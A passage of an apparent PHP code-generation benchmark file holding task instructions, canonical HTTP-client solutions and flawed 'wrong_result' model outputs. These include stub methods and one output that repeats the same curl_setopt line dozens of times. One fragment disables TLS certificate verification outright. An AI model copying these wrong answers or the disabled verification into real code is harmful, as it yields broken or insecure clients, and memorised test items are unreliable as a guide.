curl_setopt($this->curl_handle, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($this->curl_handle, CURLOPT_MAXREDIRS, 10);\n        curl_setopt($this->curl_handle, CURLOPT_SSL_VERIFYPEER, false);\n        curl_setopt($this->curl_handle, CURLOPT_SSL_VERIFYHOST, false);\n        curl_setopt($this->curl_handle, CURLOPT_TIMEOUT, 60);\n        curl_setopt"
  },
  {
    "Task_id": 7,
    "Instruction": "Task Description: Create a PHP class that utilizes the Guzzle HTTP client to synchronize video processing tasks with a remote API endpoint, handling request signing and response parsing.\n\nClass Description: The SyncVideo class provides functionality to send video processing requests to a remote API endpoint using HTTP POST requests. It handles request signing, timeout configuration, and response parsing.\n\nAttributes:\n- config: [Upyun\\Config] - Configuration object containing service credentials, timeout settings, and endpoint information\n\nMethods:\n- __construct(Config $config) -> [void] - Initializes the class with the provided configuration object\n- process(array $params, string $path) -> [array] - Sends a synchronized video processing request to the specified path with the given parameters, returns the parsed JSON response",
    "Canonical_solution": "use GuzzleHttp\\Client;\nuse Upyun\\Config;\nuse Upyun\\Signature;\n\nclass SyncVideo {\n    protected $config;\n\n    public function __construct(Config $config)\n    {\n        $this->config = $config;\n    }\n\n    public function process($params, $path) {\n        $client = new Client([\n            'timeout' => $this->config->timeout,\n        ]);\n\n        $path = '/' . $this->config->serviceName . $path;\n        $method = 'POST';\n        $signedHeaders = Signature::getHeaderSign($this->config, $method, $path);\n\n        $url = $this->config->getSyncVideoEndPoint() . $path;\n        $response = $client->request($method, $url, [\n            'headers' => $signedHeaders,\n            'json' => $params\n        ]);\n\n        $body = $response->getBody()->getContents();\n        return json_decode($body, true);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 133,
    "wrong_result": "```php\n<?php\n\nuse GuzzleHttp\\Client;\nuse GuzzleHttp\\Exception\\RequestException;\nuse Upyun\\Config;\n\nclass SyncVideo\n{\n    private $config;\n\n    public function __construct(Config $config)\n    {\n        $this->config = $config;\n    }\n\n    public function process(array $params, string $path): array\n    {\n        $client = new Client([\n            'base_uri' => $this->config->getEndpoint(),\n            'timeout' => $this->config->getTimeout(),\n        ]);\n\n        $headers = [\n            'Authorization' => $this->signRequest($params),\n            'Content-Type' => 'application/json',\n        ];\n\n        try {\n            $response = $client->post($path, [\n                'headers' => $headers,\n                'json' => $params,\n            ]);\n\n            return json_decode($response->getBody(), true);\n        } catch (RequestException $e) {\n            // Handle request exception\n            return ['error' => $e->getMessage()];\n        }\n    }\n\n    private function signRequest(array $params): string\n    {\n        // Implement request signing logic here\n        return '';\n    }\n}\n?>\n```"
  },
  {
    "Task_id": 75,
    "Instruction": "Task Description: Create a PHP class that implements HTTP client functionality using cURL, supporting various HTTP methods, streaming, authentication, and proxy configuration.\n\nClass Description: The RequestCore class provides a comprehensive HTTP client implementation using PHP's cURL extension. It supports standard HTTP methods (GET, POST, PUT, DELETE, HEAD), handles request/response processing, streaming uploads/downloads, authentication, proxy configuration, and SSL verification.\n\nAttributes:\n\nrequest_url: string - The URL to send the request to\nrequest_headers: array - Associative array of request headers\nrequest_body: string - The request body content\nresponse: string - The complete response including headers and body\nresponse_headers: array - Parsed response headers\nresponse_body: string - The response body content\nresponse_code: int - HTTP response status code\nresponse_info: array - Additional cURL response information\ncurl_handle: resource - The cURL handle resource\nmethod: string - HTTP method (GET, POST, PUT, DELETE, HEAD)\nproxy: array|null - Proxy configuration details\nusername: string|null - Username for authentication\npassword: string|null - Password for authentication\ncurlopts: array|null - Additional cURL options\ndebug_mode: bool - Whether to enable debug mode\nrequest_class: string - Class name for request handling\nresponse_class: string - Class name for response handling\nuseragent: string - User-Agent header value\nread_file: string|null - File path for streaming read\nread_stream: resource|null - Stream resource for reading\nread_stream_size: int|null - Size of read stream\nread_stream_read: int - Bytes read from stream\nwrite_file: string|null - File path for streaming write\nwrite_stream: resource|null - Stream resource for writing\nseek_position: int|null - Position to seek in read stream\ncacert_location: mixed - CA certificate location\nssl_verification: bool - Whether to verify SSL\nregistered_streaming_read_callback: callable|null - Callback for streaming read\nregistered_streaming_write_callback: callable|null - Callback for streaming write\ntimeout: int - Request timeout in seconds\nconnect_timeout: int - Connection timeout in seconds\n\nMethods:\n\n__construct(string $url = null, string $proxy = null, array $helpers = null) -> self - Initializes the request with URL and optional proxy/helpers\n__destruct() -> self - Cleans up open file handles\nset_credentials(string $user, string $pass) -> self - Sets authentication credentials\nadd_header(string $key, string $value) -> self - Adds a request header\nremove_header(string $key) -> self - Removes a request header\nset_method(string $method) -> self - Sets the HTTP method\nset_useragent(string $ua) -> self - Sets the User-Agent header\nset_body(string $body) -> self - Sets the request body\nset_request_url(string $url) -> self - Sets the request URL\nset_curlopts(array $curlopts) -> self - Sets additional cURL options\nset_read_stream_size(int $size) -> self - Sets the read stream size\nset_read_stream(resource $resource, int $size = null) -> self - Sets the read stream resource\nset_read_file(string $location) -> self - Sets a file for streaming read\nset_write_stream(resource $resource) -> self - Sets the write stream resource\nset_write_file(string $location) -> self - Sets a file for streaming write\nset_proxy(string $proxy) -> self - Configures proxy settings\nset_seek_position(int $position) -> self - Sets the seek position for read stream\nregister_streaming_read_callback(callable $callback) -> self - Registers streaming read callback\nregister_streaming_write_callback(callable $callback) -> self - Registers streaming write callback\nstreaming_read_callback(resource $curl_handle, resource $file_handle, int $length) -> string - Callback for streaming read\nstreaming_write_callback(resource $curl_handle, string $data) -> int - Callback for streaming write\nprep_request() -> resource - Prepares and returns a cURL handle\nprocess_response(resource $curl_handle = null, string $response = null) -> mixed - Processes the cURL response\nsend_request(bool $parse = false) -> mixed - Sends the request and returns response\nsend_multi_request(array $handles, array $opt = null) -> array - Sends multiple requests in parallel",
    "Canonical_solution": "namespace NOS\\Http;\n\nclass RequestCore\n{\n    public $request_url;\n    public $request_headers;\n    public $request_body;\n    public $response;\n    public $response_headers;\n    public $response_body;\n    public $response_code;\n    public $response_info;\n    public $curl_handle;\n    public $method;\n    public $proxy = null;\n    public $username = null;\n    public $password = null;\n    public $curlopts = null;\n    public $debug_mode = false;\n    public $request_class = 'NOS\\Http\\RequestCore';\n    public $response_class = 'NOS\\Http\\ResponseCore';\n    public $useragent = 'RequestCore/1.4.3';\n    public $read_file = null;\n    public $read_stream = null;\n    public $read_stream_size = null;\n    public $read_stream_read = 0;\n    public $write_file = null;\n    public $write_stream = null;\n    public $seek_position = null;\n    public $cacert_location = false;\n    public $ssl_verification = true;\n    public $registered_streaming_read_callback = null;\n    public $registered_streaming_write_callback = null;\n    public $timeout = 5184000;\n    public $connect_timeout = 10;\n\n    const HTTP_GET = 'GET';\n    const HTTP_POST = 'POST';\n    const HTTP_PUT = 'PUT';\n    const HTTP_DELETE = 'DELETE';\n    const HTTP_HEAD = 'HEAD';\n\n    public function __construct($url = null, $proxy = null, $helpers = null)\n    {\n        $this->request_url = $url;\n        $this->method = self::HTTP_GET;\n        $this->request_headers = array();\n        $this->request_body = '';\n\n        if (isset($helpers['request']) && !empty($helpers['request'])) {\n            $this->request_class = $helpers['request'];\n        }\n\n        if (isset($helpers['response']) && !empty($helpers['response'])) {\n            $this->response_class = $helpers['response'];\n        }\n\n        if ($proxy) {\n            $this->set_proxy($proxy);\n        }\n\n        return $this;\n    }\n\n    public function __destruct()\n    {\n        if (isset($this->read_file) && isset($this->read_stream)) {\n            fclose($this->read_stream);\n        }\n\n        if (isset($this->write_file) && isset($this->write_stream)) {\n            fclose($this->write_stream);\n        }\n\n        return $this;\n    }\n\n    public function set_credentials($user, $pass)\n    {\n        $this->username = $user;\n        $this->password = $pass;\n        return $this;\n    }\n\n    public function add_header($key, $value)\n    {\n        $this->request_headers[$key] = $value;\n        return $this;\n    }\n\n    public function remove_header($key)\n    {\n        if (isset($this->request_headers[$key])) {\n            unset($this->request_headers[$key]);\n        }\n        return $this;\n    }\n\n    public function set_method($method)\n    {\n        $this->method = strtoupper($method);\n        return $this;\n    }\n\n    public function set_useragent($ua)\n    {\n        $this->useragent = $ua;\n        return $this;\n    }\n\n    public function set_body($body)\n    {\n        $this->request_body = $body;\n        return $this;\n    }\n\n    public function set_request_url($url)\n    {\n        $this->request_url = $url;\n        return $this;\n    }\n\n    public function set_curlopts($curlopts)\n    {\n        $this->curlopts = $curlopts;\n        return $this;\n    }\n\n    public function set_read_stream_size($size)\n    {\n        $this->read_stream_size = $size;\n        return $this;\n    }\n\n    public function set_read_stream($resource, $size = null)\n    {\n        if (!isset($size) || $size < 0) {\n            $stats = fstat($resource);\n\n            if ($stats && $stats['size'] >= 0) {\n                $position = ftell($resource);\n\n                if ($position !== false && $position >= 0) {\n                    $size = $stats['size'] - $position;\n                }\n            }\n        }\n\n        $this->read_stream = $resource;\n        return $this->set_read_stream_size($size);\n    }\n\n    public function set_read_file($location)\n    {\n        $this->read_file = $location;\n        $read_file_handle = fopen($location, 'r');\n        return $this->set_read_stream($read_file_handle);\n    }\n\n    public function set_write_stream($resource)\n    {\n        $this->write_stream = $resource;\n        return $this;\n    }\n\n    public function set_write_file($location)\n    {\n        $this->write_file = $location;\n        $write_file_handle = fopen($location, 'w');\n        return $this->set_write_stream($write_file_handle);\n    }\n\n    public function set_proxy($proxy)\n    {\n        $proxy = parse_url($proxy);\n        $proxy['user'] = isset($proxy['user']) ? $proxy['user'] : null;\n        $proxy['pass'] = isset($proxy['pass']) ? $proxy['pass'] : null;\n        $proxy['port'] = isset($proxy['port']) ? $proxy['port'] : null;\n        $this->proxy = $proxy;\n        return $this;\n    }\n\n    public function set_seek_position($position)\n    {\n        $this->seek_position = isset($position) ? (integer)$position : null;\n        return $this;\n    }\n\n    public function register_streaming_read_callback($callback)\n    {\n        $this->registered_streaming_read_callback = $callback;\n        return $this;\n    }\n\n    public function register_streaming_write_callback($callback)\n    {\n        $this->registered_streaming_write_callback = $callback;\n        return $this;\n    }\n\n    public function streaming_read_callback($curl_handle, $file_handle, $length)\n    {\n        if ($this->read_stream_read >= $this->read_stream_size) {\n            return '';\n        }\n\n        if ($this->read_stream_read == 0 && isset($this->seek_position) && $this->seek_position !== ftell($this->read_stream)) {\n            if (fseek($this->read_stream, $this->seek_position) !== 0) {\n                throw new RequestCore_Exception('The stream does not support seeking and is either not at the requested position or the position is unknown.');\n            }\n        }\n\n        $read = fread($this->read_stream, min($this->read_stream_size - $this->read_stream_read, $length));\n        $this->read_stream_read += strlen($read);\n        $out = $read === false ? '' : $read;\n\n        if ($this->registered_streaming_read_callback) {\n            call_user_func($this->registered_streaming_read_callback, $curl_handle, $file_handle, $out);\n        }\n\n        return $out;\n    }\n\n    public function streaming_write_callback($curl_handle, $data)\n    {\n        $length = strlen($data);\n        $written_total = 0;\n        $written_last = 0;\n\n        while ($written_total < $length) {\n            $written_last = fwrite($this->write_stream, substr($data, $written_total));\n\n            if ($written_last === false) {\n                return $written_total;\n            }\n\n            $written_total += $written_last;\n        }\n\n        if ($this->registered_streaming_write_callback) {\n            call_user_func($this->registered_streaming_write_callback, $curl_handle, $written_total);\n        }\n\n        return $written_total;\n    }\n\n    public function prep_request()\n    {\n        $curl_handle = curl_init();\n        curl_setopt($curl_handle, CURLOPT_URL, $this->request_url);\n        curl_setopt($curl_handle, CURLOPT_FILETIME, true);\n        curl_setopt($curl_handle, CURLOPT_FRESH_CONNECT, false);\n        curl_setopt($curl_handle, CURLOPT_MAXREDIRS, 5);\n        curl_setopt($curl_handle, CURLOPT_HEADER, true);\n        curl_setopt($curl_handle, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($curl_handle, CURLOPT_TIMEOUT, $this->timeout);\n        curl_setopt($curl_handle, CURLOPT_CONNECTTIMEOUT, $this->connect_timeout);\n        curl_setopt($curl_handle, CURLOPT_NOSIGNAL, true);\n        curl_setopt($curl_handle, CURLOPT_REFERER, $this->request_url);\n        curl_setopt($curl_handle, CURLOPT_USERAGENT, $this->useragent);\n        curl_setopt($curl_handle, CURLOPT_READFUNCTION, array($this, 'streaming_read_callback'));\n\n        if ($this->ssl_verification) {\n            curl_setopt($curl_handle, CURLOPT_SSL_VERIFYPEER, true);\n            curl_setopt($curl_handle, CURLOPT_SSL_VERIFYHOST, 2);\n        } else {\n            curl_setopt($curl_handle, CURLOPT_SSL_VERIFYPEER, false);\n            curl_setopt($curl_handle, CURLOPT_SSL_VERIFYHOST, false);\n        }\n\n        if ($this->cacert_location === true) {\n            curl_setopt($curl_handle, CURLOPT_CAINFO, dirname(__FILE__) . '/cacert.pem');\n        } elseif (is_string($this->cacert_location)) {\n            curl_setopt($curl_handle, CURLOPT_CAINFO, $this->cacert_location);\n        }\n\n        if ($this->debug_mode) {\n            curl_setopt($curl_handle, CURLOPT_VERBOSE, true);\n        }\n\n        if (!ini_get('safe_mode') && !ini_get('open_basedir')) {\n            curl_setopt($curl_handle, CURLOPT_FOLLOWLOCATION, true);\n        }\n\n        if ($this->proxy) {\n            curl_setopt($curl_handle, CURLOPT_HTTPPROXYTUNNEL, true);\n            $host = $this->proxy['host'];\n            $host .= ($this->proxy['port']) ? ':' . $this->proxy['port'] : '';\n            curl_setopt($curl_handle, CURLOPT_PROXY, $host);\n\n            if (isset($this->proxy['user']) && isset($this->proxy['pass'])) {\n                curl_setopt($curl_handle, CURLOPT_PROXYUSERPWD, $this->proxy['user'] . ':' . $this->proxy['pass']);\n            }\n        }\n\n        if ($this->username && $this->password) {\n            curl_setopt($curl_handle, CURLOPT_HTTPAUTH, CURLAUTH_ANY);\n            curl_setopt($curl_handle, CURLOPT_USERPWD, $this->username . ':' . $this->password);\n        }\n\n        if (extension_loaded('zlib')) {\n            curl_setopt($curl_handle, CURLOPT_ENCODING, '');\n        }\n\n        if (isset($this->request_headers) && count($this->request_headers)) {\n            $temp_headers = array();\n            foreach ($this->request_headers as $k => $v) {\n                $temp_headers[] = $k . ': ' . $v;\n            }\n            curl_setopt($curl_handle, CURLOPT_HTTPHEADER, $temp_headers);\n        }\n\n        switch ($this->method) {\n            case self::HTTP_PUT:\n                curl_setopt($curl_handle, CURLOPT_CUSTOMREQUEST, 'PUT');\n                if (isset($this->read_stream)) {\n                    if (!isset($this->read_stream_size) || $this->read_stream_size < 0) {\n                        throw new RequestCore_Exception('The stream size for the streaming upload cannot be determined.');\n                    }\n                    curl_setopt($curl_handle, CURLOPT_INFILESIZE, $this->read_stream_size);\n                    curl_setopt($curl_handle, CURLOPT_UPLOAD, true);\n                } else {\n                    curl_setopt($curl_handle, CURLOPT_POSTFIELDS, $this->request_body);\n                }\n                break;\n\n            case self::HTTP_POST:\n                curl_setopt($curl_handle, CURLOPT_POST, true);\n                curl_setopt($curl_handle, CURLOPT_POSTFIELDS, $this->request_body);\n                break;\n\n            case self::HTTP_HEAD:\n                curl_setopt($curl_handle, CURLOPT_CUSTOMREQUEST, self::HTTP_HEAD);\n                curl_setopt($curl_handle, CURLOPT_NOBODY, 1);\n                break;\n\n            default:\n                curl_setopt($curl_handle, CURLOPT_CUSTOMREQUEST, $this->method);\n                if (isset($this->write_stream)) {\n                    curl_setopt($curl_handle, CURLOPT_WRITEFUNCTION, array($this, 'streaming_write_callback'));\n                    curl_setopt($curl_handle, CURLOPT_HEADER, false);\n                } else {\n                    curl_setopt($curl_handle, CURLOPT_POSTFIELDS, $this->request_body);\n                }\n                break;\n        }\n\n        if (isset($this->curlopts) && sizeof($this->curlopts) > 0) {\n            foreach ($this->curlopts as $k => $v) {\n                curl_setopt($curl_handle, $k, $v);\n            }\n        }\n\n        return $curl_handle;\n    }\n\n    public function process_response($curl_handle = null, $response = null)\n    {\n        if ($curl_handle && $response) {\n            $this->curl_handle = $curl_handle;\n            $this->response = $response;\n        }\n\n        if (is_resource($this->curl_handle)) {\n            $header_size = curl_getinfo($this->curl_handle, CURLINFO_HEADER_SIZE);\n            $this->response_headers = substr($this->response, 0, $header_size);\n            $this->response_body = substr($this->response, $header_size);\n            $this->response_code = curl_getinfo($this->curl_handle, CURLINFO_HTTP_CODE);\n            $this->response_info = curl_getinfo($this->curl_handle);\n\n            $this->response_headers = explode(\"\\r\\n\\r\\n\", trim($this->response_headers));\n            $this->response_headers = array_pop($this->response_headers);\n            $this->response_headers = explode(\"\\r\\n\", $this->response_headers);\n            array_shift($this->response_headers);\n\n            $header_assoc = array();\n            foreach ($this->response_headers as $header) {\n                $kv = explode(': ', $header);\n                $header_assoc[strtolower($kv[0])] = isset($kv[1]) ? $kv[1] : '';\n            }\n\n            $this->response_headers = $header_assoc;\n            $this->response_headers['_info'] = $this->response_info;\n            $this->response_headers['_info']['method'] = $this->method;\n\n            if ($curl_handle && $response) {\n                return new ResponseCore($this->response_headers, $this->response_body, $this->response_code);\n            }\n        }\n\n        return false;\n    }\n\n    public function send_request($parse = false)\n    {\n        set_time_limit(0);\n        $curl_handle = $this->prep_request();\n        $this->response = curl_exec($curl_handle);\n\n        if ($this->response === false) {\n            throw new RequestCore_Exception('cURL resource: ' . (string)$curl_handle . '; cURL error: ' . curl_error($curl_handle) . ' (' . curl_errno($curl_handle) . ')');\n        }\n\n        $parsed_response = $this->process_response($curl_handle, $this->response);\n        curl_close($curl_handle);\n\n        if ($parse) {\n            return $parsed_response;\n        }\n\n        return $this->response;\n    }\n\n    public function send_multi_request($handles, $opt = null)\n    {\n        set_time_limit(0);\n        if (count($handles) === 0) return array();\n        if (!$opt) $opt = array();\n\n        $limit = isset($opt['limit']) ? $opt['limit'] : -1;\n        $handle_list = $handles;\n        $http = new $this->request_class();\n        $multi_handle = curl_multi_init();\n        $handles_post = array();\n        $added = count($handles);\n        $last_handle = null;\n        $count = 0;\n        $i = 0;\n\n        while ($i < $added) {\n            if ($limit > 0 && $i >= $limit) break;\n            curl_multi_add_handle($multi_handle, array_shift($handles));\n            $i++;\n        }\n\n        do {\n            $active = false;\n            while (($status = curl_multi_exec($multi_handle, $active)) === CURLM_CALL_MULTI_PERFORM) {\n                if (count($handles) > 0) break;\n            }\n\n            $to_process = array();\n            while ($done = curl_multi_info_read($multi_handle)) {\n                if ($done['result'] > 0) {\n                    throw new RequestCore_Exception('cURL resource: ' . (string)$done['handle'] . '; cURL error: ' . curl_error($done['handle']) . ' (' . $done['result'] . ')');\n                } elseif (!isset($to_process[(int)$done['handle']])) {\n                    $to_process[(int)$done['handle']] = $done;\n                }\n            }\n\n            foreach ($to_process as $pkey => $done) {\n                $response = $http->process_response($done['handle'], curl_multi_getcontent($done['handle']));\n                $key = array_search($done['handle'], $handle_list, true);\n                $handles_post[$key] = $response;\n\n                if (count($handles) > 0) {\n                    curl_multi_add_handle($multi_handle, array_shift($handles));\n                }\n\n                curl_multi_remove_handle($multi_handle, $done['handle']);\n                curl_close($done['handle']);\n            }\n        } while ($active || count($handles_post) < $added);\n\n        curl_multi_close($multi_handle);\n        ksort($handles_post, SORT_N",
    "Code_level": "Class-level",
    "FSMID_for_test": 132,
    "wrong_result": "```php\n<?php\n\nclass RequestCore\n{\n    protected $request_url;\n    protected $request_headers;\n    protected $request_body;\n    protected $response;\n    protected $response_headers;\n    protected $response_body;\n    protected $response_code;\n    protected $response_info;\n    protected $curl_handle;\n    protected $method;\n    protected $proxy;\n    protected $username;\n    protected $password;\n    protected $curlopts;\n    protected $debug_mode;\n    protected $request_class;\n    protected $response_class;\n    protected $useragent;\n    protected $read_file;\n    protected $read_stream;\n    protected $read_stream_size;\n    protected $read_stream_read;\n    protected $write_file;\n    protected $write_stream;\n    protected $seek_position;\n    protected $cacert_location;\n    protected $ssl_verification;\n    protected $registered_streaming_read_callback;\n    protected $registered_streaming_write_callback;\n    protected $timeout;\n    protected $connect_timeout;\n\n    public function __construct(string $url = null, string $proxy = null, array $helpers = null)\n    {\n        // Initialization code\n    }\n\n    public function __destruct()\n    {\n        // Cleanup code\n    }\n\n    public function set_credentials(string $user, string $pass)\n    {\n        // Set credentials code\n    }\n\n    public function add_header(string $key, string $value)\n    {\n        // Add header code\n    }\n\n    public function remove_header(string $key)\n    {\n        // Remove header code\n    }\n\n    public function set_method(string $method)\n    {\n        // Set method code\n    }\n\n    public function set_useragent(string $ua)\n    {\n        // Set user agent code\n    }\n\n    public function set_body(string $body)\n    {\n        // Set body code\n    }\n\n    public function set_request_url(string $url)\n    {\n        // Set request URL code\n    }\n\n    public function set_curlopts(array $curlopts)\n    {\n        // Set cURL options code\n    }\n\n    public function set_read_stream_size(int $size)\n    {\n        // Set read stream size code\n    }\n\n    public function set_read_stream(resource $resource, int $size = null)\n    {\n        // Set read stream code\n    }\n\n    public function set_read_file(string $location)\n    {\n        // Set read file code\n    }\n\n    public function set_write_stream(resource $resource)\n    {\n        // Set write stream code\n    }\n\n    public function set_write_file(string $location)\n    {\n        // Set write file code\n    }\n\n    public function set_proxy(string $proxy)\n    {\n        // Set proxy code\n    }\n\n    public function set_seek_position(int $position)\n    {\n        // Set seek position code\n    }\n\n    public function register_streaming_read_callback(callable $callback)\n    {\n        // Register streaming read callback code\n    }\n\n    public function register_streaming_write_callback(callable $callback)\n    {\n        // Register streaming write callback code\n    }\n\n    protected function streaming_read_callback(resource $curl_handle, resource $file_handle, int $length)\n    {\n        // Streaming read callback code\n    }\n\n    protected function streaming_write_callback(resource $curl_handle, string $data)\n    {\n        // Streaming write callback code\n    }\n\n    protected function prep_request()\n    {\n        // Prepare request code\n    }\n\n    protected function process_response(resource $curl_handle = null, string $response = null)\n    {\n        // Process response code\n    }\n\n    public function send_request(bool $parse = false)\n    {\n        // Send request code\n    }\n\n    public function send_multi_request(array $handles, array $opt = null)\n    {\n        // Send multi request code\n    }\n}\n?>\n```"
  },
  {
    "Task_id": 76,
    "Instruction": "Task Description: Create a PHP class that implements an HTTP client using cURL to make HTTP requests, handle responses, and manage redirects while maintaining request details like headers, status codes, and response body.\n\nClass Description: The `File` class represents an HTTP client that uses cURL to make HTTP requests. It handles request execution, response parsing, redirect following, and error management. It implements the `SimplePie\\HTTP\\Response` interface, providing methods to access response details.\n\nAttributes:\n\n- url: string - The final requested URL after any redirects\n- useragent: string - The user agent string used for the request\n- success: bool - Indicates whether the request was successful\n- headers: array - The response headers from the request\n- body: string - The response body content\n- status_code: int - The HTTP status code of the response\n- redirects: int - The number of redirects followed\n- error: string - Any error message encountered during the request\n- method: int - The method used for the request (bitmask)\n- permanent_url: string - The original URL before any redirects\n- permanentUrlMutable: bool - Flag indicating if permanent URL can be changed\n\nMethods:\n\n- __construct(string $url, int $timeout = 10, int $redirects = 5, ?array $headers = null, ?string $useragent = null, bool $force_fsockopen = false, array $curl_options = []) -> void - Initializes the HTTP client, makes the request, and processes the response. Handles redirects recursively.\n- get_body_content(): string - Returns the response body content\n- get_headers(): array - Returns the response headers\n- get_status_code(): int - Returns the HTTP status code\n- get_final_requested_uri(): string - Returns the final URL after any redirects\n- get_permanent_uri(): string - Returns the original URL before any redirects",
    "Canonical_solution": "use SimplePie\\HTTP\\Response;\n\nclass File implements Response\n{\n    private $url;\n    private $useragent;\n    private $success = true;\n    private $headers = [];\n    private $body;\n    private $status_code = 0;\n    private $redirects = 0;\n    private $error;\n    private $method;\n    private $permanent_url;\n    private $permanentUrlMutable = true;\n\n    public function __construct(string $url, int $timeout = 10, int $redirects = 5, ?array $headers = null, ?string $useragent = null, bool $force_fsockopen = false, array $curl_options = [])\n    {\n        $this->url = $url;\n        $this->permanent_url = $url;\n        $this->useragent = $useragent;\n\n        if (preg_match('/^http(s)?:\\/\\//i', $url)) {\n            if ($useragent === null) {\n                $useragent = ini_get('user_agent');\n                $this->useragent = $useragent;\n            }\n            if (!is_array($headers)) {\n                $headers = [];\n            }\n            if (!$force_fsockopen && function_exists('curl_exec')) {\n                $this->method = \\SimplePie\\SimplePie::FILE_SOURCE_REMOTE | \\SimplePie\\SimplePie::FILE_SOURCE_CURL;\n                $fp = curl_init();\n                $headers2 = [];\n                foreach ($headers as $key => $value) {\n                    $headers2[] = \"$key: $value\";\n                }\n                curl_setopt($fp, CURLOPT_URL, $url);\n                curl_setopt($fp, CURLOPT_HEADER, 1);\n                curl_setopt($fp, CURLOPT_RETURNTRANSFER, 1);\n                curl_setopt($fp, CURLOPT_FAILONERROR, 1);\n                curl_setopt($fp, CURLOPT_TIMEOUT, $timeout);\n                curl_setopt($fp, CURLOPT_CONNECTTIMEOUT, $timeout);\n                curl_setopt($fp, CURLOPT_REFERER, \\SimplePie\\Misc::url_remove_credentials($url));\n                curl_setopt($fp, CURLOPT_USERAGENT, $useragent);\n                curl_setopt($fp, CURLOPT_HTTPHEADER, $headers2);\n                foreach ($curl_options as $curl_param => $curl_value) {\n                    curl_setopt($fp, $curl_param, $curl_value);\n                }\n\n                $responseHeaders = curl_exec($fp);\n                $this->status_code = curl_getinfo($fp, CURLINFO_HTTP_CODE);\n                if (curl_errno($fp)) {\n                    $this->error = 'cURL error ' . curl_errno($fp) . ': ' . curl_error($fp);\n                    $this->success = false;\n                } else {\n                    if ($info = curl_getinfo($fp)) {\n                        $this->url = $info['url'];\n                    }\n                    curl_close($fp);\n                    $responseHeaders = \\SimplePie\\HTTP\\Parser::prepareHeaders($responseHeaders, $info['redirect_count'] + 1);\n                    $parser = new \\SimplePie\\HTTP\\Parser($responseHeaders, true);\n                    if ($parser->parse()) {\n                        $this->headers = $parser->headers;\n                        $this->body = trim($parser->body);\n                        $this->status_code = $parser->status_code;\n                        if ((in_array($this->status_code, [300, 301, 302, 303, 307]) || $this->status_code > 307 && $this->status_code < 400) && $this->redirects < $redirects) {\n                            $this->redirects++;\n                            $this->permanentUrlMutable = $this->permanentUrlMutable && ($this->status_code == 301 || $this->status_code == 308);\n                            $this->__construct($this->url, $timeout, $redirects, $headers, $useragent, $force_fsockopen, $curl_options);\n                            return;\n                        }\n                    }\n                }\n            }\n        }\n    }\n\n    public function get_body_content(): string\n    {\n        return (string) $this->body;\n    }\n\n    public function get_headers(): array\n    {\n        return $this->headers;\n    }\n\n    public function get_status_code(): int\n    {\n        return (int) $this->status_code;\n    }\n\n    public function get_final_requested_uri(): string\n    {\n        return (string) $this->url;\n    }\n\n    public function get_permanent_uri(): string\n    {\n        return (string) $this->permanent_url;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 132,
    "wrong_result": "```php\nclass File implements SimplePie_HTTP_Response {\n    private $url;\n    private $useragent;\n    private $success;\n    private $headers;\n    private $body;\n    private $status_code;\n    private $redirects;\n    private $error;\n    private $method;\n    private $permanent_url;\n    private $permanentUrlMutable;\n\n    public function __construct(string $url, int $timeout = 10, int $redirects = 5, ?array $headers = null, ?string $useragent = null, bool $force_fsockopen = false, array $curl_options = []) {\n        $this->permanent_url = $url;\n        $this->permanentUrlMutable = false;\n        $this->method = SimplePie_HTTP::METHOD_GET;\n        $this->redirects = 0;\n        $this->useragent = $useragent;\n        $this->execute($url, $timeout, $redirects, $headers, $force_fsockopen, $curl_options);\n    }\n\n    private function execute(string $url, int $timeout = 10, int $redirects = 5, ?array $headers = null, bool $force_fsockopen = false, array $curl_options = []) {\n        $ch = curl_init();\n        curl_setopt($ch, CURLOPT_URL, $url);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);\n        curl_setopt($ch, CURLOPT_MAXREDIRS, $redirects);\n        curl_setopt($ch, CURLOPT_HEADER, true);\n        curl_setopt($ch, CURLOPT_NOBODY, true);\n        curl_setopt($ch, CURLOPT_USERAGENT, $this->useragent);\n        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);\n        curl_setopt($ch, CURLOPT_FORBID_REUSE, 